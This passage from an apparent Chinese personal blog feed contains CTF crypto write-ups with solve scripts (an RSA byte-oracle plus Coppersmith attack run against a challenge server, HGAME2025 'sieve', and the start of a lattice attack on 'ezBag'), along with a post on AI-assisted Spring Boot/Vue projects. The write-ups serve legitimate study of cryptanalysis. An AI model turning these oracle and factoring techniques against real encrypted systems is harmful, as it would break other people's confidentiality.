class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br><br>    <span class="hljs-comment"># https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#rsa-byte-oracle</span><br>    c=<span class="hljs-built_in">int</span>.from_bytes(Hint1,<span class="hljs-string">&#x27;little&#x27;</span>)<br>    <br>    decimal.getcontext().prec = <span class="hljs-built_in">int</span>(<span class="hljs-number">2048</span>)<br>    L = decimal.Decimal(<span class="hljs-built_in">int</span>(<span class="hljs-number">0</span>))<br>    R = decimal.Decimal(<span class="hljs-built_in">int</span>(r2n))<br><br>    <span class="hljs-comment">#自测</span><br>    <span class="hljs-comment">#127*8=1016 差不多将r1.p乘到跟r2.N一个数量级了</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">127</span>):<br>        c = (c * <span class="hljs-built_in">pow</span>(<span class="hljs-number">256</span>, r2e, r2n)) % r2n<br><br>        interval=(R-L)/<span class="hljs-built_in">int</span>(<span class="hljs-number">256</span>)<br>        L=L+interval*<span class="hljs-built_in">int</span>(<span class="hljs-number">0</span>)<br>        R=L+interval<br><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">75</span>):<br>        sh.recvuntil(<span class="hljs-string">b&#x27;(y/[n])?&#x27;</span>)<br>        sh.sendline(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>        c = <span class="hljs-built_in">int</span>((c * <span class="hljs-built_in">pow</span>(<span class="hljs-number">256</span>, r2e, r2n)) % r2n)<br><br>        sh.recvuntil(<span class="hljs-string">b&#x27;(in hex):&#x27;</span>)<br>        <span class="hljs-comment">#这里不zfill服务器会报错</span><br>        sh.sendline(<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">512</span>).encode())<br><br>        sh.recvuntil(<span class="hljs-string">b&#x27;Result: &#x27;</span>)<br>        x=<span class="hljs-built_in">bytes</span>.fromhex(sh.recvline().strip().decode())<br>        res=<span class="hljs-built_in">int</span>.from_bytes(x,<span class="hljs-string">&#x27;little&#x27;</span>)<br>        res=<span class="hljs-built_in">int</span>(res%<span class="hljs-number">256</span>)<br><br><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(-j*r2n%<span class="hljs-number">256</span>)==res:<br>                interval=(R-L)/<span class="hljs-built_in">int</span>(<span class="hljs-number">256</span>)<br>                L=L+interval*j<br>                R=L+interval<br><br><br>    high_p=(<span class="hljs-built_in">int</span>(R)&gt;&gt;<span class="hljs-number">440</span>)&lt;&lt;<span class="hljs-number">440</span><br><br>    PR.&lt;x&gt; = PolynomialRing(Zmod(r1n))<br>    f = high_p + x<br>    x = f.small_roots(X = <span class="hljs-number">2</span>^<span class="hljs-number">440</span>,beta = <span class="hljs-number">0.4</span>)<br>    p=<span class="hljs-built_in">int</span>(high_p+x[<span class="hljs-number">0</span>])<br><br>    q=<span class="hljs-built_in">int</span>(r1n//p)<br><br>    e=<span class="hljs-number">65537</span><br>    d=inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(<span class="hljs-built_in">int</span>(ciphertext),<span class="hljs-built_in">int</span>(d),<span class="hljs-built_in">int</span>(r1n)))))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AI小项目之springboot+vue</title>
    <link href="/2025/03/19/springbootvue/"/>
    <url>/2025/03/19/springbootvue/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/naby1/springboot_vue">https://github.com/naby1/springboot_vue</a></p></blockquote><p>由于客观原因，尝试0基础接触springboot+vue</p><p>在Ai的帮助下（指99%的代码，使用的是元宝的deepseek深度思考，无联网），写了两个小项目，这里记录一下。</p><h1 id="文件系统"><a class="markdownIt-Anchor" href="#文件系统"></a> 文件系统</h1><p>（由于本人技术太差，基本都是写在一个文件中，勿喷）</p><p>实现了简单的文件系统，根目录配置在java/src/main/java/org.example/controller/FileController.java第31行的BASE_PATH中<br /><img src="/imgs/springbootvue/file/1.png" alt="" /></p><p>实现功能：</p><ol><li><p>左上角显示当前目录路径，AI的说法是面包屑导航。</p></li><li><p>右上角有新建文件夹和上传功能，上传按钮左侧点击是可以直接上传文件，右侧按钮可以选择上传文件夹和上传文件。在设计时新建文件夹功能会在当前目录生成一个空文件夹，命名为“新建文件夹”，并且由于不可重名问题，无法在新建文件夹，所以算是bug吧，但我懒得改了。<br /><img src="/imgs/springbootvue/file/2.png" alt="2" /></p></li><li><p>下方本体就是显示文件的表，有名称，大小（文件才有），修改时间，都有排序功能（自带的sortable）</p></li><li><p>对于下方文件表中每一栏文件/目录，双击可以进入目录（修改当前访问路径并向后端请求所在目录文件）。右键会有菜单栏，可以进行下载、重命名和删除操作。<br /><img src="/imgs/springbootvue/file/3.png" alt="3" /></p></li></ol><h1 id="学生管理系统"><a class="markdownIt-Anchor" href="#学生管理系统"></a> 学生管理系统</h1><p>实现前端、后端和数据库的基本操作，增删改查等基础功能。<br />个人感悟：使用路由，分开设计比较方便管理。<br /><img src="/imgs/springbootvue/student/1.png" alt="1" /></p><h2 id="数据库设计"><a class="markdownIt-Anchor" href="#数据库设计"></a> 数据库设计</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE user (<br>  id INT PRIMARY KEY AUTO_INCREMENT,<br>  name VARCHAR(20) NOT NULL,<br>  passwd CHAR(32) NOT NULL,<br>  birthday DATE,<br>  sex ENUM(&#x27;M&#x27;,&#x27;F&#x27;) DEFAULT &#x27;M&#x27;,<br>  phone VARCHAR(20),<br>  email VARCHAR(50),<br>  addr VARCHAR(125),<br>  education ENUM(&#x27;PHD&#x27;,&#x27;MASTER&#x27;,&#x27;BACHELOR&#x27;,&#x27;ASSOCIATE&#x27;,&#x27;HIGHSCHOOL&#x27;,&#x27;JUNIORHS&#x27;,&#x27;JUNIORHS&#x27;,&#x27;OTHER&#x27;),<br>  create_time DATETIME DEFAULT CURRENT_TIMESTAMP,<br>  last_time DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP<br>);<br></code></pre></td></tr></table></figure><blockquote><p>PHD - 博士<br />MASTER - 硕士<br />BACHELOR - 本科<br />ASSOCIATE - 大专<br />HIGHSCHOOL - 高中<br />JUNIORHS - 初中<br />PRIMARY - 小学<br />OTHER - 其他</p></blockquote><p>测试数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO user (name, passwd, birthday, sex, phone, email, addr, education) <br>VALUES (<br>  &#x27;张三&#x27;, <br>  MD5(&#x27;zhangsan&#x27;), <br>  &#x27;2000-01-01&#x27;, <br>  &#x27;M&#x27;, <br>  &#x27;13812345678&#x27;, <br>  &#x27;zhangsan@example.com&#x27;, <br>  &#x27;北京市朝阳区&#x27;, <br>  &#x27;BACHELOR&#x27;<br>);<br></code></pre></td></tr></table></figure><h2 id="查询功能"><a class="markdownIt-Anchor" href="#查询功能"></a> 查询功能</h2><p>点击后就会显示查询到的所有数据，密码在后端就进行了隐藏。默认一页显示20条数据，最下方可以选择页数和显示条数。在最上方能对四个属性进行查询，可单独查询也可组合查询。<br /><img src="/imgs/springbootvue/student/2.png" alt="2" /></p><h2 id="删除功能"><a class="markdownIt-Anchor" href="#删除功能"></a> 删除功能</h2><p>输入待删除的ID，点击查询，会先显示用户信息进行确认，然后再删除（删除一开始不可点，当然这只是前端设置）<br /><img src="/imgs/springbootvue/student/3.png" alt="3" /></p><h2 id="添加功能"><a class="markdownIt-Anchor" href="#添加功能"></a> 添加功能</h2><p>就是简单的添加数据，在后端会对添加数据进行校验（在model处）<br /><img src="/imgs/springbootvue/student/4.png" alt="4" /></p><h2 id="修改功能"><a class="markdownIt-Anchor" href="#修改功能"></a> 修改功能</h2><p>先查询后修改，ID、创建时间和修改时间不可更改，其他都可以更改，同样由于model的设置，会对数据进行校验。<br /><img src="/imgs/springbootvue/student/5.png" alt="5" /></p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>感觉AI写小功能还行，但是上下文有点差，特别是格式都很难统一，对于分文件编写有点困难。写了这两个项目感觉不能说没有收获，只能说收获很小，如果只是自己随便当小玩意用那没啥说的，但如果想要深入了解对应技术，还是不太够，对于真正的项目结构、代码规范和一些理论基础还是要靠时间和努力。</p>]]></content>
    
    
    <categories>
      
      <category>springboot</category>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>springboot</tag>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME2025-Crypto</title>
    <link href="/2025/02/12/hgame2025_1/"/>
    <url>/2025/02/12/hgame2025_1/</url>
    
    <content type="html"><![CDATA[<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="sieve"><a class="markdownIt-Anchor" href="#sieve"></a> sieve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> nextprime<br><br>FLAG = <span class="hljs-string">b&#x27;hgame&#123;xxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span><br>m = bytes_to_long(FLAG)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">trick</span>(<span class="hljs-params">k</span>):<br>    <span class="hljs-keyword">if</span> k &gt; <span class="hljs-number">1</span>:<br>        mul = prod(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,k)) <br>        <span class="hljs-keyword">if</span> k - mul % k - <span class="hljs-number">1</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> euler_phi(k) + trick(k-<span class="hljs-number">1</span>) + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> euler_phi(k) + trick(k-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br>e = <span class="hljs-number">65537</span><br>p = q = nextprime(trick(e^<span class="hljs-number">2</span>//<span class="hljs-number">6</span>)&lt;&lt;<span class="hljs-number">128</span>)<br>n = p * q<br>enc = <span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;enc=&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>trick</code>计算的是小于k的所有数的<code>欧拉函数之和</code>加上<code>素数的个数</code></p><p>这个<code>k - mul % k - 1 == 0</code>成立代表此时为素数(因为wilson定理)</p><p>然后使用c/c++写脚本比较好，python容易爆了</p><h3 id="计算素数的个数"><a class="markdownIt-Anchor" href="#计算素数的个数"></a> 计算素数的个数</h3><p>埃氏筛</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n=<span class="hljs-number">715849728</span>;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">isPrime</span><span class="hljs-params">(n)</span></span>;<br>    <span class="hljs-type">int</span> count=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;n;i++)&#123;<br>        <span class="hljs-keyword">if</span>(!isPrime[i])&#123;<br>            count++;<br>            <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> j=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)i*i;<br>            <span class="hljs-keyword">while</span>(j&lt;n)&#123;<br>                isPrime[j]=<span class="hljs-number">1</span>;<br>                j+=i;<br>            &#125;<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;count&lt;&lt;endl;<br>    <span class="hljs-comment">//37030583</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="计算欧拉函数之和"><a class="markdownIt-Anchor" href="#计算欧拉函数之和"></a> 计算欧拉函数之和</h3><p>这个找了个脚本</p><p><a href="https://blog.csdn.net/qq_35914587/article/details/78173379">快速求欧拉函数之和-CSDN博客</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e7</span><span class="hljs-number">+1</span>;<br>ll phi[N<span class="hljs-number">+10</span>],prime[N<span class="hljs-number">+10</span>];<br><span class="hljs-type">int</span> tot;<br><span class="hljs-type">bool</span> mark[N<span class="hljs-number">+10</span>];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getphi</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    phi[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)<br>     &#123;<br>        <span class="hljs-keyword">if</span>(!mark[i])<br>        &#123;<br>            prime[++tot]=i;<br>            phi[i]=i<span class="hljs-number">-1</span>;<span class="hljs-comment">//性质1</span><br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=tot&amp;&amp;i*prime[j]&lt;=n;j++)<br>        &#123;<br>            mark[i*prime[j]]=<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(!(i%prime[j]))<br>             &#123;<br>                phi[i*prime[j]]=phi[i]*prime[j];<span class="hljs-comment">//性质2</span><br>                <span class="hljs-keyword">break</span>;<br>             &#125;<br>            <span class="hljs-keyword">else</span><br>             phi[i*prime[j]]=phi[i]*(prime[j]<span class="hljs-number">-1</span>);<br>        &#125;<br>     &#125;<br><br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)<br>      phi[i]+=phi[i<span class="hljs-number">-1</span>];<br>&#125;<br><span class="hljs-function">ll <span class="hljs-title">work</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(n&lt;=N) <span class="hljs-keyword">return</span> phi[n];<br>    ll ans=<span class="hljs-number">0</span>;<span class="hljs-type">int</span> pos;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i=pos<span class="hljs-number">+1</span>)<br>    &#123;<br>        pos=n/(n/i);<span class="hljs-comment">//向下取整，很长一段是相同的</span><br>        ans+=(pos-i<span class="hljs-number">+1</span>)*<span class="hljs-built_in">work</span>(n/i);<br>    &#125;<br>    <span class="hljs-keyword">return</span> (ll)n*(n<span class="hljs-number">+1</span>)/<span class="hljs-number">2</span>-ans;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">getphi</span>(N);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld&quot;</span>,<span class="hljs-built_in">work</span>(n));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="flag"><a class="markdownIt-Anchor" href="#flag"></a> flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> nextprime<br><br>e = <span class="hljs-number">65537</span><br>trick_result = <span class="hljs-number">155763335410704472</span>+<span class="hljs-number">37030583</span><br><br>p = q = nextprime(trick_result&lt;&lt;<span class="hljs-number">128</span>)<br><span class="hljs-built_in">print</span>(p.bit_length())<br>phi=p**<span class="hljs-number">2</span>-p<br>enc=<span class="hljs-number">2449294097474714136530140099784592732766444481665278038069484466665506153967851063209402336025065476172617376546</span><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(enc,inverse(e,phi),p*p))))<br><span class="hljs-comment">#b&#x27;hgame&#123;sieve_is_n0t_that_HArd&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="ezbag"><a class="markdownIt-Anchor" href="#ezbag"></a> ezBag</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-built_in">list</span> = []<br>bag = []<br>p=random.getrandbits(<span class="hljs-number">64</span>)<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(p)[<span class="hljs-number">2</span>:])==<span class="hljs-number">64</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    t = p<br>    a=[getPrime(<span class="hljs-number">32</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]<br>    b=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>        temp=t%<span class="hljs-number">2</span><br>        b+=temp*i<br>        t=t&gt;&gt;<span class="hljs-number">1</span><br>    <span class="hljs-built_in">list</span>.append(a)<br>    bag.append(b)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;list=<span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;bag=<span class="hljs-subst">&#123;bag&#125;</span>&#x27;</span>)<br><br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(p).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = pad(flag,<span class="hljs-number">16</span>)<br>ciphertext = cipher.encrypt(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ciphertext=<span class="hljs-subst">&#123;ciphertext&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>01背包问题，但无法使用常规脚本求解</p><p>只使用一组数据的话会发现密度已经到了2.0了，很明显不满足</p><p>所以可以多用几组数据构造格（为什么这样能出我也不知道）</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>63</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>63</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>63</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>63</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>62</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>62</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>62</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>62</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋱</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo><mo 